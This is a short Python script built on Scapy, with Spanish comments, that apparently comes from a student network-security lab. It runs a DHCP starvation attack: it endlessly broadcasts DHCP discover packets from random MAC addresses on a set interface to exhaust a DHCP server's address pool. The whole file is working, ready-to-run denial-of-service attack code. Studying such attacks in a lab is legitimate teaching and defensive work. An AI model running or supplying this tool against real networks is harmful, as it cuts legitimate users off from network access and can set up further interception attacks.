from scapy.all import *
import time

# Configuracion basada en matricula 2024-2011
iface = "eth1" 

def dhcp_starvation():
    print("Iniciando ataque DHCP Starvation... Presiona Ctrl+C para detener.")
    while True:
        # Generamos una MAC aleatoria
        rand_mac = RandMAC()
        # Construimos el paquete de forma mas robusta
        pkt = Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=rand_mac) / \
              DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(pkt, iface=iface, verbose=False)

if __name__ == "__main__":
    dhcp_starvation()

